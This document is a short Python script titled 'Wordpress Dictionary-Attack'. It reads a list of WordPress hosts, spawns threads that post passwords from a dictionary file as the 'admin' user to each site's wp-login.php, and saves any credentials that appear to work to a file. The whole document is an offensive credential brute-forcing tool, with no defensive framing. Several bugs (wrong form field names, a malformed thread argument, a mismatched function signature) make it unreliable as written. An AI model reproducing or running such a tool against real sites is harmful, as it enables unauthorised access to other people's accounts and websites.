"""
Wordpress Dictionary-Attack
"""
import requests
import threading

def Login(url,password):
    session = requests.session()
    target = url+"/wp-login.php"
    Passwords = open('dictionary.log','r').read().splitlines()
    for password in Passwords:
        LoginData = {"user":"admin","pass":password}
        result = session.post(target,LoginData)
        VALiD = "post-new.php"
        if VALiD in result.content.decode('utf-8'):
            safe = open('wordpress.txt','a')
            safe.write(target+" user: admin password: "+password+"\n")
            safe.close()
            break

count = len(open('log_wordpress.txt').readlines())
i = 0
Threads = []
Hosts = open('log_wordpress.txt','r').read().splitlines()

while not (i == count):
    for host in Hosts:
            Threads = threading.Thread(target=Login,args=(host))
            Threads.start()
            i = i+1   
